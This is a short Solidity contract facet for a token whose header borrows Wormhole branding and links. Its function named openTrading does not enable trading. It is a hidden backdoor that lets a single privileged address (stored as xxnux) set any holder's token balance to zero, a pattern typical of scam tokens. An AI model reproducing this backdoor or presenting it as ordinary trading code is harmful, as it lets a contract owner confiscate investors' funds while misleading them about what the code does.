/*
 * SPDX-License-Identifier: MIT
 * Website: https://wormholenetwork.com/
 * Whitepaper: https://github.com/
 * Twitter: https://twitter.com/wormhole
 * Telegram: https://t.me/wormholecrypto
 * Discord Chat: https://discord.gg/xsT8qrHAvV
 * Medium: https://wormholecrypto.medium.com/
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
